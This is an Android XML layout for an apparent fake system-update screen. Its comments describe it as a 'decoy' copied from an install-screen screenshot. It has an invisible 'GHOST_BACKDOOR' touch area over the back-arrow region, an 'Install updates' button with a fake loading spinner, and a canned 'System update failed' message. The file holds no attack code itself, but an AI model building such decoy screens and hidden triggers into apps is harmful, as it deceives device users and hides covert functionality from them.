<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#000000">

    <!-- High-Fidelity Decoy Base (Screenshot 1: Install screen) -->

    <!-- GHOST_BACKDOOR: Positioned over the 'Back' arrow area (Top-Left) -->

    <!-- Button Container for Realistic Loading -->

    <ImageView
        android:id="@+id/ivDecoyBase"
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:adjustViewBounds="true"
        android:scaleType="fitCenter"
        android:src="@drawable/update1"
        app:layout_constraintBottom_toTopOf="@+id/buttonContainer"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintHorizontal_bias="0.0"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent"
        app:layout_constraintVertical_bias="0.0" />

    <View
        android:id="@+id/ivUpdateIcon"
        android:layout_width="178dp"
        android:layout_height="161dp"
        android:layout_marginStart="1020dp"
        android:layout_marginTop="148dp"
        android:background="@android:color/transparent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

    <FrameLayout
        android:id="@+id/buttonContainer"
        android:layout_width="217dp"
        android:layout_height="75dp"
        android:layout_marginHorizontal="24dp"
        android:layout_marginBottom="32dp"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent">

        <!-- High-Fidelity Spinning Four-Dot Loading Effect -->

        <com.google.android.material.button.MaterialButton
            android:id="@+id/btnCheckUpdate"
            android:layout_width="match_parent"
            android:layout_height="60dp"
            android:layout_marginTop="15dp"
            android:backgroundTint="#3574EE"
            android:fontFamily="@font/assistant"
            android:letterSpacing="0.034"
            android:text="Install updates"
            android:textAllCaps="false"
            android:textColor="#F6F6F6"
            android:textSize="17sp"
            android:textStyle="bold"
            app:cornerRadius="32dp"
            app:layout_constraintTop_toTopOf="parent" />

        <androidx.constraintlayout.widget.ConstraintLayout
            android:id="@+id/loadingLayout"
            android:layout_width="40dp"
            android:layout_height="40dp"
            android:layout_gravity="center"
            android:visibility="gone">

            <ImageView
                android:id="@+id/dot1"
                android:layout_width="8dp"
                android:layout_height="8dp"
                android:src="@drawable/loading_dot"
                app:layout_constraintStart_toStartOf="parent"
                app:layout_constraintTop_toTopOf="parent" />

            <ImageView
                android:id="@+id/dot2"
                android:layout_width="8dp"
                android:layout_height="8dp"
                android:src="@drawable/loading_dot"
                app:layout_constraintEnd_toEndOf="parent"
                app:layout_constraintTop_toTopOf="parent" />

            <ImageView
                android:id="@+id/dot3"
                android:layout_width="8dp"
                android:layout_height="8dp"
                android:src="@drawable/loading_dot"
                app:layout_constraintBottom_toBottomOf="parent"
                app:layout_constraintStart_toStartOf="parent" />

            <ImageView
                android:id="@+id/dot4"
                android:layout_width="8dp"
                android:layout_height="8dp"
                android:src="@drawable/loading_dot"
                app:layout_constraintBottom_toBottomOf="parent"
                app:layout_constraintEnd_toEndOf="parent" />

        </androidx.constraintlayout.widget.ConstraintLayout>

    </FrameLayout>

    <LinearLayout
        android:id="@+id/pseudoToast"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginBottom="120dp"
        android:background="@drawable/toast_background"
        android:gravity="center_vertical"
        android:orientation="horizontal"
        android:paddingHorizontal="20dp"
        android:paddingVertical="12dp"
        android:visibility="gone"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="System update failed. Server unreachable."
            android:textColor="#FFFFFF"
            android:textSize="14sp" />
    </LinearLayout>

</androidx.constraintlayout.widget.ConstraintLayout>
